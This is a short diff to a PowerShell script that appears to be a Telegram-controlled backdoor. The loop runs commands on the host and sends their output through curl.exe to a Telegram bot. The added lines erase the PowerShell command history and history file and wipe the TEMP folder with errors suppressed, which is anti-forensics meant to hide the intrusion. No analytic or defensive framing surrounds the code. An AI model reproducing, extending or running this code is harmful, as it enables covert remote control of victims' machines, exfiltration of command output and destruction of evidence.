@@ -54,6 +54,15 @@ while ($true) {
                     }
                     if (-not $output) { $output = "[Command executed with no output]" }
                     
+                    try {
+                        $historyPath = (Get-PSReadLineOption).HistorySavePath
+                        if ($historyPath -and (Test-Path $historyPath)) {
+                            Clear-History
+                            Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+                        }
+                        Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+                    } catch { }
+   
                     Write-Host $output -ForegroundColor White
                     $encodedOut = [System.Web.HttpUtility]::UrlEncode("`n$output")
                     & curl.exe -s "https://api.telegram.org/bot$Token/sendMessage?chat_id=$chatId&text=$encodedOut" > $null
